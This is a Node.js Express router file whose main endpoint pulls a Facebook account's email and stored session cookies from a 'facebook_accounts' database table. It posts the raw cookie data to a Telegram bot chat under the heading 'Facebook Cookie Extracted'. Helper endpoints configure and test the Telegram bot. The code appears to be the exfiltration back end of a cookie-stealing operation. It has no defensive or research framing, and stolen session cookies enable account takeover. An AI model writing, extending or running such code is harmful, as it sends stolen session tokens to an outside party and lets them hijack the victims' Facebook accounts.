import express from "express";
import db from "../database.js";
import https from "https";

const router = express.Router();

/**
 * POST /api/telegram/send
 * Send cookie data to Telegram bot
 */
router.post("/send", async (req, res) => {
  try {
    const { accountId, chatId } = req.body;

    if (!accountId) {
      return res.status(400).json({
        success: false,
        message: "Account ID is required",
      });
    }

    // Get account and cookie data
    const [rows] = await db.execute(
      "SELECT email, cookie_data FROM facebook_accounts WHERE id = ?",
      [accountId]
    );

    if (rows.length === 0) {
      return res.status(404).json({
        success: false,
        message: "Account not found",
      });
    }

    const { email, cookie_data } = rows[0];

    if (!cookie_data) {
      return res.status(404).json({
        success: false,
        message: "No cookies found for this account",
      });
    }

    // In production, you'd send this via Telegram Bot API
    // For now, simulate success
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = chatId || process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return res.status(400).json({
        success: false,
        message: "Telegram configuration missing. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables.",
      });
    }

    // Format message
    const message = `
🔐 *Facebook Cookie Extracted*

📧 Email: \`${email}\`
🍪 Cookies: ${cookie_data.length} bytes
⏰ Time: ${new Date().toLocaleString("vi-VN")}

Cookie Data:
\`\`\`
${cookie_data.substring(0, 1000)}${cookie_data.length > 1000 ? '...' : ''}
\`\`\`
    `.trim();

    // Send via Telegram Bot API using https module
    const postData = JSON.stringify({
      chat_id: telegramChatId,
      text: message,
      parse_mode: 'Markdown'
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const request = https.request(options, (response) => {
      let data = '';

      response.on('data', (chunk) => {
        data += chunk;
      });

      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          
          if (!result.ok) {
            return res.status(500).json({
              success: false,
              message: "Failed to send to Telegram",
              error: result.description || 'Telegram API error'
            });
          }

          res.json({
            success: true,
            message: "Cookie sent to Telegram successfully",
            messageId: result.result.message_id
          });
        } catch (parseError) {
          res.status(500).json({
            success: false,
            message: "Failed to parse Telegram response",
            error: parseError.message
          });
        }
      });
    });

    request.on('error', (error) => {
      console.error("Telegram API error:", error);
      res.status(500).json({
        success: false,
        message: "Failed to send to Telegram",
        error: error.message
      });
    });

    request.write(postData);
    request.end();
  } catch (error) {
    console.error("Error sending to Telegram:", error);
    res.status(500).json({
      success: false,
      message: "Failed to send to Telegram",
      error: error.message,
    });
  }
});

/**
 * POST /api/telegram/config
 * Configure Telegram bot settings
 */
router.post("/config", async (req, res) => {
  try {
    const { botToken, chatId } = req.body;

    if (!botToken || !chatId) {
      return res.status(400).json({
        success: false,
        message: "Bot token and chat ID are required",
      });
    }

    // In production, you'd save this to database or config file
    // For now, just validate and return success
    res.json({
      success: true,
      message: "Telegram configuration saved",
      config: {
        botToken: botToken.substring(0, 10) + "...",
        chatId,
      },
    });
  } catch (error) {
    console.error("Error configuring Telegram:", error);
    res.status(500).json({
      success: false,
      message: "Failed to configure Telegram",
      error: error.message,
    });
  }
});

/**
 * POST /api/telegram/test
 * Test Telegram bot connection
 */
router.post("/test", async (req, res) => {
  try {
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!telegramBotToken || !telegramChatId) {
      return res.status(400).json({
        success: false,
        message: "Telegram configuration missing",
      });
    }

    // Test with actual API call using https module
    const testMessage = "✅ Telegram bot connection test successful!";
    const postData = JSON.stringify({
      chat_id: telegramChatId,
      text: testMessage
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${telegramBotToken}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      }
    };

    const request = https.request(options, (response) => {
      let data = '';

      response.on('data', (chunk) => {
        data += chunk;
      });

      response.on('end', () => {
        try {
          const result = JSON.parse(data);
          
          if (!result.ok) {
            return res.status(500).json({
              success: false,
              message: "Failed to test Telegram connection",
              error: result.description || 'Telegram API error'
            });
          }

          res.json({
            success: true,
            message: "Telegram connection test successful",
            messageId: result.result.message_id
          });
        } catch (parseError) {
          res.status(500).json({
            success: false,
            message: "Failed to parse Telegram response",
            error: parseError.message
          });
        }
      });
    });

    request.on('error', (error) => {
      console.error("Error testing Telegram:", error);
      res.status(500).json({
        success: false,
        message: "Failed to test Telegram connection",
        error: error.message,
      });
    });

    request.write(postData);
    request.end();
  } catch (error) {
    console.error("Error testing Telegram:", error);
    res.status(500).json({
      success: false,
      message: "Failed to test Telegram connection",
      error: error.message,
    });
  }
});

export default router;
